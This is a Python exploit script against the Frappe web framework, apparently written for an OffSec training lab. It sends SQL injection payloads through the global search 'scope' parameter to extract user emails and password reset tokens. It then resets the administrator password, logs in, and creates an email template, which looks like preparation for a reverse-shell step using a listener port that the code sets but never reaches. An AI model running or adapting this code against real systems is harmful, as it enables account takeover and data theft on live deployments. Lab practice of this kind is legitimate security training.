import sys, re, os
import requests
import subprocess
import base64
import json
import datetime
requests.packages.urllib3.disable_warnings()
from urllib.parse import quote

def send_sql_comamnd(ip, command):
	target = f"http://{ip}:8000"
	data = {
		"cmd": "frappe.utils.global_search.web_search",
		"text": "offsec",
		"scope": command
	}
	r = requests.post(target, data=data)
	resp = json.loads(r.text)
	if "message" not in resp:
		print("HTML request unsuccessful")
		exit(0)
	return resp["message"]

def get_admin_user_email(ip):
	command = "test_scope\" UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci FROM __Auth#"

	output = send_sql_comamnd(ip, command)
	output = [i['route'] for i in output] # Filter to only last term 
	output = [i for i in output if ".com" in i] # Filter for email addresses

	if len(output) == 0:
		print("No valid users found")
		exit(0)

	if len(output) > 1:
		print(f"Multiple valid users found, using {output[0]}")

	admin_email = output[0]

	return admin_email

def send_reset_password(ip, admin_email):
	target = f"http://{ip}:8000"
	data = {
		"cmd": "frappe.core.doctype.user.user.reset_password",
		"user": admin_email
	}
	r = requests.post(target, data=data)
	print(r.text)
	if "Password reset instructions" not in r.text:
		print("Password reset unsuccessful")
		exit(0)

	print("Password reset successful")

def get_password_reset_token(ip, admin_email):
	command = f"test_scope\" UNION ALL SELECT 1,2,3,4,reset_password_key COLLATE utf8mb4_general_ci FROM tabUser WHERE name = \"{admin_email}\"#"

	output = send_sql_comamnd(ip, command)
	if len(output) != 1:
		print("Token not found")
		exit(0)

	token = output[0]['route']
	return token

def reset_password(ip, admin_email, token, new_password):
	s = requests.Session()

	# proxies = {
	# 	'http': 'http://127.0.0.1:8080',
	# 	'https': 'http://127.0.0.1:8080'
	# }
	# s.proxies.update(proxies)

	target = f"http://{ip}:8000"
	data = {
		"key": token,
		"old_password": "",
		"new_password": new_password,
		"cmd": "frappe.core.doctype.user.user.update_password"
	}

	r = s.post(target,data=data)

	if "/desk" in r.text:
		print("Password reset successful!")
		print(f"New password: {new_password}")
		return

	print("Password reset unsuccessful")
	exit(0)

def login(ip, admin_email, password):
	s = requests.Session() # Send request with session to keep persistent session variable

	target = f"http://{ip}:8000"
	data = {
		"cmd": "login",
		"usr": admin_email,
		"pwd": password
	}

	headers = {
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
	}
	s.headers.update(headers)

	proxies = {
		'http': 'http://127.0.0.1:8080',
		'https': 'http://127.0.0.1:8080'
	}
	s.proxies.update(proxies)

	r = s.post(target, data=data)

	if "Logged In" in r.text:
		print("Successful login!")
		return s
	
	print("Login failed")
	exit(0)

def create_email_template(ip, session, admin_email):
	curtime = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")
	
	records = [{
		"user":admin_email,
		"creation": curtime,
		"route":"List/Email Template/List"
	}]

	import urllib.parse
	data = {
		"doctype":"Route History",
		"records": json.dumps(records)
	}

	target = f"http://{ip}:8000/api/method/frappe.deferred_insert.deferred_insert"

	r = session.post(target, data=data)
	
	doc = {
		"docstatus":0,
		"doctype":"Email Template",
		"name":"New Email Template 2",
		"__islocal":1,
		"__unsaved":1,
		"owner":admin_email,
		"__newname":"test3","subject":"test3","response":"<div>test3</div>"
	}

	target = f"http://{ip}:8000/api/method/frappe.desk.form.save.savedocs"

	data = {
		"doc": json.dumps(doc),
		"action": "Save"
	}
	
	r = session.post(target, data=data)

	return

def main():
    if len(sys.argv) != 2:
        print ("(+) usage: %s <target>" % sys.argv[0])
        print ('(+) eg: %s 192.168.121.103'  % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]
    LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
    LPORT = 9001
    new_password = "PwnedPassword!"

    admin_email = get_admin_user_email(ip)
    print(f"Admin email {admin_email} found!")

    # print("Sending password reset......")
    # send_reset_password(ip, admin_email)

    # print("Searching for password reset token")
    # token = get_password_reset_token(ip, admin_email)
    # print(f"Sucessfully got reset token {token}")

    # print("Restting password")
    # reset_password(ip, admin_email, token, new_password)
    # print("Password reset succesfully!")

    print("Logging in now")
    session = login(ip, admin_email, new_password)

    create_email_template(ip, session, admin_email)

if __name__ == '__main__':
	main()